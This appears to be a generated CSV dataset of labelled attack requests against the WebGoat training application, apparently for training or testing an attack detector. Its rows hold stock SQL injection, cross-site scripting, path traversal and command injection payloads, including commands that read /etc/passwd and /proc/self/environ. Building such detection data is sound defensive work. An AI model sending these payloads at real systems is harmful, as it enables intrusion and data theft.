source_app,label,method,path,body,status_code,response_size
webgoat,attack,POST,SqlInjection/attack8,payload=c29c0b83 javascript:alert(1),400,15972
webgoat,attack,POST,SqlInjection/attack8,payload=a3c71db7 `ping 127.0.0.1`,400,15972
webgoat,attack,POST,CrossSiteScripting/attack1,payload=..\..\..\windows\win.ini -- 9fd5ba4b,200,279
webgoat,attack,POST,SqlInjection/attack8,payload=<svg/onload=alert(1)>&nonce=794cf4e4,400,15972
webgoat,attack,POST,SqlInjection/attack8,payload=124b3ff4 ' OR '1'='1,400,15972
webgoat,attack,POST,cia/command-injection,payload=85771caf ; cat /etc/passwd,404,14753
webgoat,attack,POST,CrossSiteScripting/attack1,payload=f1411f9b ..\..\..\windows\win.ini,200,279
webgoat,attack,POST,CrossSiteScripting/attack1,"payload='""><script>alert(1)</script> -- 452e578c",200,279
webgoat,attack,POST,CrossSiteScripting/attack1,payload=0f299c98 WAITFOR DELAY '0:0:5',200,279
webgoat,attack,POST,cia/command-injection,payload=../../../../etc/passwd&nonce=27002960,404,14753
webgoat,attack,POST,SqlInjection/attack8,payload=WAITFOR DELAY '0:0:5'&nonce=a08a4917,400,15972
webgoat,attack,POST,service/restxml,payload=<svg/onload=alert(1)>&nonce=336b16d6,404,14741
webgoat,attack,POST,cia/command-injection,payload=../../../../etc/passwd&nonce=b5368704,404,14753
webgoat,attack,POST,SqlInjection/attack8,"payload=077de7df UNION SELECT NULL, NULL",400,15972
webgoat,attack,POST,CrossSiteScripting/attack1,payload=; cat /etc/passwd&nonce=f7544df4,200,279
webgoat,attack,POST,service/restxml,payload=1844937c ../../../../etc/passwd,404,14741
webgoat,attack,POST,CrossSiteScripting/attack1,payload=/proc/self/environ&nonce=b1e0ba01,200,279
webgoat,attack,POST,SqlInjection/attack8,payload=<script>alert('XSS')</script>&nonce=1ac07545,400,15972
webgoat,attack,POST,SqlInjection/attack8,payload=javascript:alert(1) -- cd9ce8cc,400,15972
webgoat,attack,POST,CrossSiteScripting/attack1,payload=/proc/self/environ&nonce=03a12797,200,279
webgoat,attack,POST,SqlInjection/attack8,payload=fd7951db /proc/self/environ,400,15972
webgoat,attack,POST,cia/command-injection,payload=WAITFOR DELAY '0:0:5'&nonce=92dabf01,404,14753
webgoat,attack,POST,SqlInjection/attack8,"payload='""><script>alert(1)</script>&nonce=ab9e7ae5",400,15972
webgoat,attack,POST,cia/command-injection,payload=javascript:alert(1) -- a7287679,404,14753
webgoat,attack,POST,CrossSiteScripting/attack1,payload=/proc/self/environ&nonce=f5278f36,200,279
webgoat,attack,POST,SqlInjection/attack8,payload=' OR '1'='1&nonce=71de54d3,400,15972
webgoat,attack,POST,SqlInjection/attack8,payload=javascript:alert(1) -- 0eaea2cc,400,15972
webgoat,attack,POST,CrossSiteScripting/attack1,payload=admin' -- -- 6378efdb,200,279
webgoat,attack,POST,SqlInjection/attack8,payload=$(id) -- 306a717c,400,15972
webgoat,attack,POST,CrossSiteScripting/attack1,payload=..\..\..\windows\win.ini -- f23ec5bb,200,279
webgoat,attack,POST,CrossSiteScripting/attack1,payload=WAITFOR DELAY '0:0:5' -- fd140701,200,279
webgoat,attack,POST,service/restxml,payload=| dir -- 1cf365e1,404,14741
webgoat,attack,POST,SqlInjection/attack8,payload=/proc/self/environ -- d82cd949,400,15972
webgoat,attack,POST,CrossSiteScripting/attack1,payload=e6cca3be <img src=x onerror=alert(1)>,200,279
webgoat,attack,POST,SqlInjection/attack8,payload=WAITFOR DELAY '0:0:5'&nonce=31e9c2aa,400,15972
webgoat,attack,POST,SqlInjection/attack8,payload=4c03a4e2 ..\..\..\windows\win.ini,400,15972
webgoat,attack,POST,SqlInjection/attack8,payload=8d5822cd ..\..\..\windows\win.ini,400,15972
webgoat,attack,POST,CrossSiteScripting/attack1,payload=<img src=x onerror=alert(1)> -- f37a9c00,200,279
webgoat,attack,POST,CrossSiteScripting/attack1,payload=<svg/onload=alert(1)> -- 1a87ba0b,200,279
webgoat,attack,POST,service/restxml,payload=e7afb428 ' OR 1=1#,404,14741
webgoat,attack,POST,CrossSiteScripting/attack1,payload=<script>alert('XSS')</script> -- 8ab7dc2a,200,279
webgoat,attack,POST,SqlInjection/attack8,payload=`ping 127.0.0.1`&nonce=ea0dcdb8,400,15972
webgoat,attack,POST,CrossSiteScripting/attack1,payload=/proc/self/environ -- d936f419,200,279
webgoat,attack,POST,CrossSiteScripting/attack1,payload=/proc/self/environ -- 364620a5,200,279
webgoat,attack,POST,SqlInjection/attack8,payload=..\..\..\windows\win.ini&nonce=1bca7177,400,15972
webgoat,attack,POST,cia/command-injection,payload=/proc/self/environ&nonce=149834ac,404,14753
webgoat,attack,POST,service/restxml,payload=9a0292cd | dir,404,14741
webgoat,attack,POST,cia/command-injection,payload=115e930e && whoami,404,14753
webgoat,attack,POST,SqlInjection/attack8,payload=<img src=x onerror=alert(1)> -- c9087c10,400,15972
webgoat,attack,POST,CrossSiteScripting/attack1,payload=<img src=x onerror=alert(1)>&nonce=4e0bee1c,200,279
webgoat,attack,POST,service/restxml,payload=/proc/self/environ -- 23343245,404,14741
webgoat,attack,POST,service/restxml,payload=; cat /etc/passwd -- b7abbe1e,404,14741
webgoat,attack,POST,service/restxml,payload=25cab817 ' OR '1'='1,404,14741
webgoat,attack,POST,cia/command-injection,payload=| dir&nonce=b82c9e8f,404,14753
webgoat,attack,POST,service/restxml,payload=cb46b2b8 ..\..\..\windows\win.ini,404,14741
webgoat,attack,POST,CrossSiteScripting/attack1,payload=<img src=x onerror=alert(1)>&nonce=319bda61,200,279
webgoat,attack,POST,SqlInjection/attack8,payload=1; DROP TABLE users&nonce=2ecb401a,400,15972
webgoat,attack,POST,SqlInjection/attack8,payload=..\..\..\windows\win.ini -- b20ebad0,400,15972
webgoat,attack,POST,service/restxml,payload=<script>alert('XSS')</script>&nonce=22a99eea,404,14741
webgoat,attack,POST,SqlInjection/attack8,payload=..\..\..\windows\win.ini&nonce=c0b0bb8c,400,15972
webgoat,attack,POST,cia/command-injection,payload=/proc/self/environ&nonce=1d4fbc2e,404,14753
webgoat,attack,POST,CrossSiteScripting/attack1,payload=/proc/self/environ -- 6ba9cebe,200,279
webgoat,attack,POST,SqlInjection/attack8,payload=$(id)&nonce=91289380,400,15972
webgoat,attack,POST,cia/command-injection,payload=../../../../etc/passwd&nonce=816ce097,404,14753
webgoat,attack,POST,service/restxml,payload=/proc/self/environ -- 076ccf08,404,14741
webgoat,attack,POST,service/restxml,payload=27849e74 <script>alert('XSS')</script>,404,14741
webgoat,attack,POST,CrossSiteScripting/attack1,payload=| dir -- 7a0dc888,200,279
webgoat,attack,POST,cia/command-injection,"payload=96d23496 '""><script>alert(1)</script>",404,14753
webgoat,attack,POST,service/restxml,payload=/proc/self/environ -- 982874e8,404,14741
webgoat,attack,POST,CrossSiteScripting/attack1,payload=2596d18b <script>alert('XSS')</script>,200,279
webgoat,attack,POST,SqlInjection/attack8,payload=admin' -- -- fa1b68ac,400,15972
webgoat,attack,POST,SqlInjection/attack8,payload=$(id)&nonce=b16bfacd,400,15972
webgoat,attack,POST,service/restxml,payload=../../../../etc/passwd -- 719671a3,404,14741
webgoat,attack,POST,CrossSiteScripting/attack1,payload=<img src=x onerror=alert(1)> -- a9b11545,200,279
webgoat,attack,POST,cia/command-injection,payload=616be4c1 <svg/onload=alert(1)>,404,14753
webgoat,attack,POST,cia/command-injection,payload=<svg/onload=alert(1)> -- 540b745d,404,14753
webgoat,attack,POST,cia/command-injection,payload=; cat /etc/passwd -- ad1156f5,404,14753
webgoat,attack,POST,CrossSiteScripting/attack1,payload=<svg/onload=alert(1)>&nonce=94820f74,200,279
webgoat,attack,POST,CrossSiteScripting/attack1,payload=<svg/onload=alert(1)>&nonce=b40660a3,200,279
webgoat,attack,POST,cia/command-injection,payload=$(id) -- c53b4860,404,14753
webgoat,attack,POST,SqlInjection/attack8,payload=&& whoami -- 7e6b1c30,400,15972
webgoat,attack,POST,service/restxml,payload=5a9bb76f <img src=x onerror=alert(1)>,404,14741
webgoat,attack,POST,service/restxml,payload=a68d07e5 1; DROP TABLE users,404,14741
webgoat,attack,POST,cia/command-injection,payload=$(id) -- 56229503,404,14753
webgoat,attack,POST,SqlInjection/attack8,payload=1; DROP TABLE users -- d7eb92e1,400,15972
webgoat,attack,POST,SqlInjection/attack8,payload=30821098 WAITFOR DELAY '0:0:5',400,15972
webgoat,attack,POST,service/restxml,payload=$(id) -- 2e89270b,404,14741
webgoat,attack,POST,CrossSiteScripting/attack1,payload=' OR 1=1# -- ee15ac9a,200,279
webgoat,attack,POST,service/restxml,payload=WAITFOR DELAY '0:0:5' -- 8548d7ee,404,14741
webgoat,attack,POST,cia/command-injection,payload=; cat /etc/passwd -- 142be52c,404,14753
webgoat,attack,POST,SqlInjection/attack8,payload=1; DROP TABLE users -- 45a5884e,400,15972
webgoat,attack,POST,cia/command-injection,payload=..\..\..\windows\win.ini&nonce=88dd8f45,404,14753
webgoat,attack,POST,SqlInjection/attack8,payload=| dir&nonce=70de87f0,400,15972
webgoat,attack,POST,CrossSiteScripting/attack1,payload=admin' --&nonce=aa67dda7,200,279
webgoat,attack,POST,cia/command-injection,payload=..\..\..\windows\win.ini&nonce=95ff6456,404,14753
webgoat,attack,POST,cia/command-injection,payload=' OR '1'='1 -- b219e3a0,404,14753
webgoat,attack,POST,SqlInjection/attack8,"payload=UNION SELECT NULL, NULL -- 2be4995a",400,15972
webgoat,attack,POST,SqlInjection/attack8,payload=<img src=x onerror=alert(1)> -- 6ad9b1c7,400,15972
webgoat,attack,POST,cia/command-injection,payload=..\..\..\windows\win.ini -- 367aed58,404,14753
webgoat,attack,POST,service/restxml,payload=f272da90 | dir,404,14741
webgoat,attack,POST,SqlInjection/attack8,payload=a2c5dee4 /proc/self/environ,400,15972
webgoat,attack,POST,SqlInjection/attack8,"payload=UNION SELECT NULL, NULL&nonce=02c1c490",400,15972
webgoat,attack,POST,service/restxml,payload=| dir&nonce=96e9dd12,404,14741
webgoat,attack,POST,service/restxml,payload=5af451fb ' OR '1'='1,404,14741
webgoat,attack,POST,service/restxml,"payload='""><script>alert(1)</script>&nonce=983752de",404,14741
webgoat,attack,POST,CrossSiteScripting/attack1,payload=1e8e0f7d ' OR '1'='1,200,279
webgoat,attack,POST,SqlInjection/attack8,payload=99b9b5c7 admin' --,400,15972
webgoat,attack,POST,CrossSiteScripting/attack1,payload=&& whoami&nonce=25aae1ed,200,279
webgoat,attack,POST,cia/command-injection,payload=<img src=x onerror=alert(1)> -- 082daac7,404,14753
webgoat,attack,POST,cia/command-injection,payload=..\..\..\windows\win.ini&nonce=7d284715,404,14753
webgoat,attack,POST,CrossSiteScripting/attack1,payload=admin' --&nonce=1eb617f6,200,279
webgoat,attack,POST,CrossSiteScripting/attack1,payload=; cat /etc/passwd&nonce=55fbe7d2,200,279
webgoat,attack,POST,SqlInjection/attack8,payload=/proc/self/environ&nonce=48e8f91d,400,15972
webgoat,attack,POST,SqlInjection/attack8,payload=2ccd3603 ; cat /etc/passwd,400,15972
webgoat,attack,POST,CrossSiteScripting/attack1,payload=<img src=x onerror=alert(1)>&nonce=ce88b988,200,279
webgoat,attack,POST,service/restxml,payload=../../../../etc/passwd -- 57c38751,404,14741
webgoat,attack,POST,cia/command-injection,payload=0bcb7299 ' OR '1'='1,404,14753
webgoat,attack,POST,SqlInjection/attack8,payload=' OR 1=1#&nonce=dd94135f,400,15972
webgoat,attack,POST,SqlInjection/attack8,payload=; cat /etc/passwd -- 1b5091d8,400,15972
webgoat,attack,POST,service/restxml,"payload='""><script>alert(1)</script> -- 31f66265",404,14741
webgoat,attack,POST,service/restxml,payload=WAITFOR DELAY '0:0:5'&nonce=e1b757ba,404,14741
webgoat,attack,POST,CrossSiteScripting/attack1,payload=..\..\..\windows\win.ini -- dc53653f,200,279
webgoat,attack,POST,cia/command-injection,payload=/proc/self/environ&nonce=1d1a55fe,404,14753
webgoat,attack,POST,service/restxml,payload=6ae45c9c javascript:alert(1),404,14741
webgoat,attack,POST,SqlInjection/attack8,"payload='""><script>alert(1)</script>&nonce=40ee41fb",400,15972
webgoat,attack,POST,service/restxml,payload=| dir&nonce=91eae59a,404,14741
webgoat,attack,POST,service/restxml,payload=WAITFOR DELAY '0:0:5' -- 1fc1b7e7,404,14741
webgoat,attack,POST,cia/command-injection,payload=<img src=x onerror=alert(1)> -- 2e990633,404,14753
webgoat,attack,POST,cia/command-injection,"payload=UNION SELECT NULL, NULL&nonce=3e47a4d7",404,14753
webgoat,attack,POST,service/restxml,payload=c3d32e05 /proc/self/environ,404,14741
webgoat,attack,POST,CrossSiteScripting/attack1,payload=d1a3a876 /proc/self/environ,200,279
webgoat,attack,POST,service/restxml,payload=<script>alert('XSS')</script> -- db09f307,404,14741
webgoat,attack,POST,CrossSiteScripting/attack1,"payload=dfb57543 UNION SELECT NULL, NULL",200,279
webgoat,attack,POST,SqlInjection/attack8,"payload=UNION SELECT NULL, NULL&nonce=a3f2e503",400,15972
webgoat,attack,POST,CrossSiteScripting/attack1,payload=..\..\..\windows\win.ini -- 5dc0fd32,200,279
webgoat,attack,POST,cia/command-injection,"payload=UNION SELECT NULL, NULL&nonce=997e5137",404,14753
webgoat,attack,POST,CrossSiteScripting/attack1,"payload=UNION SELECT NULL, NULL -- 04b73804",200,279
webgoat,attack,POST,cia/command-injection,payload=; cat /etc/passwd&nonce=3068657e,404,14753
webgoat,attack,POST,CrossSiteScripting/attack1,payload=| dir -- b4ac4178,200,279
webgoat,attack,POST,service/restxml,"payload=UNION SELECT NULL, NULL&nonce=a09d070a",404,14741
webgoat,attack,POST,SqlInjection/attack8,payload=; cat /etc/passwd -- 2af5ccbe,400,15972
webgoat,attack,POST,CrossSiteScripting/attack1,payload=; cat /etc/passwd -- 7deb0248,200,279
webgoat,attack,POST,SqlInjection/attack8,payload=javascript:alert(1) -- 169b8e2c,400,15972
webgoat,attack,POST,cia/command-injection,payload=e06fbeed ..\..\..\windows\win.ini,404,14753
webgoat,attack,POST,CrossSiteScripting/attack1,payload=<img src=x onerror=alert(1)> -- 1bfad33c,200,279
webgoat,attack,POST,CrossSiteScripting/attack1,payload=| dir&nonce=3ec38282,200,279
webgoat,attack,POST,SqlInjection/attack8,payload=<svg/onload=alert(1)> -- 1b463945,400,15972
webgoat,attack,POST,cia/command-injection,"payload=UNION SELECT NULL, NULL&nonce=55253003",404,14753
webgoat,attack,POST,CrossSiteScripting/attack1,payload=`ping 127.0.0.1` -- c3b84134,200,279
webgoat,attack,POST,cia/command-injection,payload=2efe68fe | dir,404,14753
webgoat,attack,POST,SqlInjection/attack8,payload=; cat /etc/passwd -- 447f7cf9,400,15972
webgoat,attack,POST,service/restxml,payload=..\..\..\windows\win.ini -- 08bb5fc6,404,14741
webgoat,attack,POST,CrossSiteScripting/attack1,payload=../../../../etc/passwd&nonce=95657a31,200,279
webgoat,attack,POST,SqlInjection/attack8,payload=aa7ed1e2 <script>alert('XSS')</script>,400,15972
webgoat,attack,POST,service/restxml,payload=`ping 127.0.0.1` -- 516d56b4,404,14741
webgoat,attack,POST,service/restxml,payload=WAITFOR DELAY '0:0:5'&nonce=4fa87da8,404,14741
webgoat,attack,POST,SqlInjection/attack8,payload=admin' -- -- 33b220ff,400,15972
webgoat,attack,POST,CrossSiteScripting/attack1,payload=javascript:alert(1)&nonce=8518a022,200,279
webgoat,attack,POST,cia/command-injection,payload=<img src=x onerror=alert(1)> -- 6368019c,404,14753
webgoat,attack,POST,service/restxml,payload=ee12bba8 /proc/self/environ,404,14741
webgoat,attack,POST,SqlInjection/attack8,payload=9f2f674c /proc/self/environ,400,15972
webgoat,attack,POST,cia/command-injection,payload=' OR '1'='1&nonce=14bc64db,404,14753
webgoat,attack,POST,cia/command-injection,payload=admin' -- -- a5d7da63,404,14753
webgoat,attack,POST,cia/command-injection,payload=fa1041ef ; cat /etc/passwd,404,14753
webgoat,attack,POST,cia/command-injection,payload=1; DROP TABLE users&nonce=ed59a704,404,14753
webgoat,attack,POST,SqlInjection/attack8,payload=../../../../etc/passwd -- ac2405cd,400,15972
webgoat,attack,POST,CrossSiteScripting/attack1,payload=d9be872b ; cat /etc/passwd,200,279
webgoat,attack,POST,service/restxml,payload=97ac64bc $(id),404,14741
webgoat,attack,POST,CrossSiteScripting/attack1,payload=../../../../etc/passwd -- 15e760ee,200,279
webgoat,attack,POST,cia/command-injection,payload=0bc612fd <img src=x onerror=alert(1)>,404,14753
webgoat,attack,POST,CrossSiteScripting/attack1,payload=<svg/onload=alert(1)> -- e19ff416,200,279
webgoat,attack,POST,cia/command-injection,payload=97567272 WAITFOR DELAY '0:0:5',404,14753
webgoat,attack,POST,cia/command-injection,payload=admin' -- -- f4f4bfd3,404,14753
webgoat,attack,POST,CrossSiteScripting/attack1,payload=../../../../etc/passwd&nonce=ecda36d2,200,279
webgoat,attack,POST,service/restxml,payload=<svg/onload=alert(1)>&nonce=a79f69da,404,14741
webgoat,attack,POST,CrossSiteScripting/attack1,payload=/proc/self/environ&nonce=e303bb19,200,279
webgoat,attack,POST,service/restxml,payload=`ping 127.0.0.1`&nonce=975027bf,404,14741
webgoat,attack,POST,SqlInjection/attack8,payload=4efde285 ../../../../etc/passwd,400,15972
webgoat,attack,POST,SqlInjection/attack8,payload=$(id) -- 3ed55d59,400,15972
webgoat,attack,POST,SqlInjection/attack8,"payload=14204dcd '""><script>alert(1)</script>",400,15972
webgoat,attack,POST,CrossSiteScripting/attack1,payload=<script>alert('XSS')</script> -- 257777bb,200,279
webgoat,attack,POST,service/restxml,payload=..\..\..\windows\win.ini -- b57a71bd,404,14741
webgoat,attack,POST,CrossSiteScripting/attack1,payload=$(id)&nonce=caa7b6e9,200,279
webgoat,attack,POST,CrossSiteScripting/attack1,payload=..\..\..\windows\win.ini -- d2000213,200,279
webgoat,attack,POST,service/restxml,payload=9db732c0 1; DROP TABLE users,404,14741
webgoat,attack,POST,CrossSiteScripting/attack1,payload=admin' -- -- bc3dbcd8,200,279
webgoat,attack,POST,cia/command-injection,payload=| dir -- 9f439dff,404,14753
webgoat,attack,POST,CrossSiteScripting/attack1,payload=admin' -- -- 70eb6196,200,279
webgoat,attack,POST,cia/command-injection,payload=; cat /etc/passwd -- cefad74b,404,14753
webgoat,attack,POST,SqlInjection/attack8,payload=a37b13af javascript:alert(1),400,15972
webgoat,attack,POST,SqlInjection/attack8,payload=c07fd8e5 ../../../../etc/passwd,400,15972
webgoat,attack,POST,cia/command-injection,payload=0358efd8 ../../../../etc/passwd,404,14753
webgoat,attack,POST,CrossSiteScripting/attack1,payload=&& whoami&nonce=1f411adf,200,279
webgoat,attack,POST,cia/command-injection,"payload=UNION SELECT NULL, NULL&nonce=1a944ce2",404,14753
webgoat,attack,POST,SqlInjection/attack8,payload=| dir -- 396ad8ff,400,15972
webgoat,attack,POST,cia/command-injection,"payload=a0b4dbfe '""><script>alert(1)</script>",404,14753
webgoat,attack,POST,CrossSiteScripting/attack1,"payload='""><script>alert(1)</script>&nonce=53afb46e",200,279
webgoat,attack,POST,CrossSiteScripting/attack1,payload=; cat /etc/passwd&nonce=1d65b706,200,279
webgoat,attack,POST,SqlInjection/attack8,payload=$(id) -- 46e41202,400,15972
webgoat,attack,POST,service/restxml,payload=<script>alert('XSS')</script>&nonce=39ed3811,404,14741
webgoat,attack,POST,CrossSiteScripting/attack1,payload=1; DROP TABLE users -- e029acde,200,279
webgoat,attack,POST,cia/command-injection,payload=' OR '1'='1&nonce=846cffd3,404,14753
webgoat,attack,POST,service/restxml,payload=$(id)&nonce=8c47348b,404,14741
webgoat,attack,POST,service/restxml,payload=| dir -- 81c99f8e,404,14741
webgoat,attack,POST,service/restxml,payload=<script>alert('XSS')</script> -- 5635d884,404,14741
webgoat,attack,POST,cia/command-injection,payload=<script>alert('XSS')</script> -- e37b7abe,404,14753
webgoat,attack,POST,cia/command-injection,payload=..\..\..\windows\win.ini&nonce=a2933b46,404,14753
